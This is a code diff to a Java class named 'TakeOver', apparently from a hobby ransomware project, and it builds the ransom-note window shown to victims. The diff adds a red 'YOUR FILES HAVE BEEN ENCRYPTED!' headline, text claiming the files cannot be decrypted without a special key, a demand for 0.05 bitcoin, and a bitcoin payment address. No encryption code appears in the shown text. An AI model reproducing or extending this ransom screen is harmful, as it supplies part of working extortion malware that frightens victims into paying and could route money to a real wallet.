@@ -17,6 +17,8 @@ import javafx.scene.text.Text;
 import javafx.scene.text.TextAlignment;
 import javafx.stage.Stage;
 
+import java.io.File;
+
 
 public class TakeOver extends Application {
 
@@ -28,24 +30,55 @@ public class TakeOver extends Application {
         grid.setAlignment(Pos.CENTER);
         grid.setHgap(10);
         grid.setVgap(10);
-        grid.setStyle("-fx-background-color:#ff0000; -fx-opacity:1;");
-        Scene scene = new Scene(grid, 800, 600);
+        grid.setStyle("-fx-background-image: url(\"Ransomeware/background.png\");");
+        Scene scene = new Scene(grid, 1200, 800);
         primaryStage.setScene(scene);
 
-        Text scenetitle = new Text("Your files have been encrypted!");
-        scenetitle.setFont(Font.font("Tahoma", FontWeight.EXTRA_BOLD, 40));
-        scenetitle.setTextAlignment(TextAlignment.CENTER);
-        grid.add(scenetitle, 0,1);
+        GridPane g = new GridPane();
+        grid.setAlignment(Pos.TOP_CENTER);
+        grid.setHgap(0);
+        grid.setVgap(0);
 
-        Image lock = new Image("File:C:\\Users\\Admin\\IdeaProjects\\JavaWare\\src\\RansomeWare\\lock.png");
+        Image lock = new Image("Ransomeware" + File.separator + "lock.png");
         ImageView lockView = new ImageView();
-        lockView.setFitHeight(100);
-        lockView.setFitWidth(100);
+        lockView.setFitHeight(300);
+        lockView.setFitWidth(300);
         lockView.setImage(lock);
+        g.add(lockView, 2, 0, 1, 1);
+        grid.add(g, 0,0);
 
-        grid.add(lockView, 0, 0);
+        GridPane gridPane = new GridPane();
+        gridPane.setAlignment(Pos.CENTER);
+        gridPane.setStyle("-fx-background-color: white;");
+        gridPane.setHgap(30);
+        gridPane.setVgap(30);
 
-        grid.setAlignment(Pos.CENTER);
+
+        grid.add(gridPane, 0,1);
+
+
+
+        Text scenetitle = new Text("YOUR FILES HAVE BEEN ENCRYPTED!");
+        scenetitle.setFont(Font.font("Tahoma", FontWeight.EXTRA_BOLD, 40));
+        scenetitle.setFill(Color.RED);
+        scenetitle.setTextAlignment(TextAlignment.CENTER);
+        scenetitle.wrappingWidthProperty().bind(gridPane.widthProperty());
+        gridPane.add(scenetitle, 0,1);
+
+
+        Text description = new Text("It is impossible to decrypt your files without a special key. The only way to get your files back is to send 0.05 bitcoin to:");
+        description.setFont(Font.font("Tahoma", FontWeight.BOLD, 15));
+        description.setTextAlignment(TextAlignment.CENTER);
+        description.baselineOffsetProperty();
+        description.wrappingWidthProperty().bind(gridPane.widthProperty());
+        gridPane.add(description, 0,3);
+
+        Text address = new Text("3JNQdC7hgXc5YneUZBAfLVW4fEZMTs2qYq");
+        address.setFont(Font.font("Tahoma", FontWeight.BOLD, 20));
+        address.setTextAlignment(TextAlignment.CENTER);
+        address.wrappingWidthProperty().bind(gridPane.widthProperty());
+        gridPane.add(address, 0,4);
+
         primaryStage.show();
     }
 }
